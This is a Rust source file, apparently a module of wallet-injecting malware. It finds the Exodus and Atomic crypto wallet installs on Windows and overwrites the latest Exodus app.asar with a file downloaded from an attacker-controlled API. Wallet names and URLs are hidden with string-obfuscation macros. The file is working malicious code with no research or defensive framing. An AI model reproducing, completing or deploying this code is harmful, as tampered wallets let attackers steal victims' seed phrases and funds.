use reqwest::blocking::Client;
use std::env;
use std::fs::{ self, File };
use std::io::{ self, Write };
use std::path::{ Path, PathBuf };
use goldberg::{ goldberg_stmts, goldberg_string };

use crate::{ API_KEY, BASE_API_URL };

/// Represents a wallet application.
pub struct WalletInfo {
    pub name: &'static str,
    pub path: PathBuf,
    pub download_url: String,
}

/// Returns a list of supported wallets.
pub fn get_wallets() -> Vec<WalletInfo> {
    goldberg_stmts!({
        let local_app_data = env::var("LOCALAPPDATA").unwrap_or_default();

        // These are owned Strings
        let name_exodus_string = goldberg_string!("Exodus").to_owned();
        let name_atomic_string = goldberg_string!("Atomic").to_owned();

        let url_exodus_string = goldberg_string!("api/asar?file=exodus.asar").to_owned();
        let url_atomic_string = goldberg_string!("api/asar?file=atomic.asar").to_owned();

        // Call `.into_boxed_str()` on owned String to get Box<str>
        let name_exodus = Box::leak(name_exodus_string.into_boxed_str());
        let name_atomic = Box::leak(name_atomic_string.into_boxed_str());

        let path_exodus = PathBuf::from(format!("{}/exodus", local_app_data));
        let url_exodus = format!("{}{}&key={}", BASE_API_URL.as_str(), &url_exodus_string, API_KEY.as_str());

        let path_atomic = PathBuf::from(format!("{}/Programs/atomic/resources", local_app_data));
        let url_atomic = format!("{}{}&key={}", BASE_API_URL.as_str(), &url_atomic_string, API_KEY.as_str());
        vec![
            WalletInfo {
                name: name_exodus,
                path: path_exodus,
                download_url: url_exodus,
            },
            WalletInfo {
                name: name_atomic,
                path: path_atomic,
                download_url: url_atomic,
            },
        ]
    })
}


/// Locates the latest Exodus asar file in the given folder.
pub fn locate_exodus_asar(folder_path: &Path) -> Option<PathBuf> {
    if !asar_exists(folder_path) {
        return None;
    }
    let entries = match fs::read_dir(folder_path) {
        Ok(e) => e,
        Err(_) => {
            return None;
        }
    };
    let mut path_array = Vec::new();

    for entry in entries.flatten() {
        let file_name = entry.file_name().to_string_lossy().to_string();
        if file_name.contains("app-") {
            let absolute_path = folder_path.join(&file_name);
            path_array.push(absolute_path);
        }
    }

    let mut highest_folder: Option<PathBuf> = None;
    let mut highest_number = 0.0;

    for file in path_array {
        if
            let Some(version_str) = file
                .file_name()
                .and_then(|f| f.to_str())
                .and_then(|s| s.split("app-").nth(1))
        {
            let mut parts = version_str.split('.');
            let major = parts.next().unwrap_or("");
            let minor = parts.next().unwrap_or("");
            let parse_str = if !minor.is_empty() {
                format!("{}.{}", major, minor)
            } else {
                major.to_string()
            };
            if let Ok(version_number) = parse_str.parse::<f64>() {
                if version_number > highest_number {
                    highest_number = version_number;
                    highest_folder = Some(file.clone());
                }
            }
        }
    }

    if let Some(folder) = highest_folder {
        let asar_path = folder.join("resources").join("app.asar");
        Some(asar_path)
    } else {
        None
    }
}

/// Checks if the given path exists.
pub fn asar_exists(path: &Path) -> bool {
    path.exists()
}

/// Downloads and replaces the asar file at the destination path.
pub fn download_and_replace_asar(
    url: &str,
    dest_path: &Path
) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let response = client.get(url).send()?;
    if response.status().is_success() {
        let mut file = File::create(dest_path)?;
        // Stream the response body directly to the file in chunks
        let mut _downloaded: u64 = 0;
        let mut buffer = vec![0u8; 8 * 1024 * 1024];
        let mut source = response;
        use std::io::Read;
        loop {
            let n = source.read(&mut buffer)?;
            if n == 0 {
                break;
            }
            file.write_all(&buffer[..n])?;
            _downloaded += n as u64;
        }
        file.flush()?;
        Ok(())
    } else {
        Err(Box::new(io::Error::new(io::ErrorKind::Other, "Failed to download file")))
    }
}
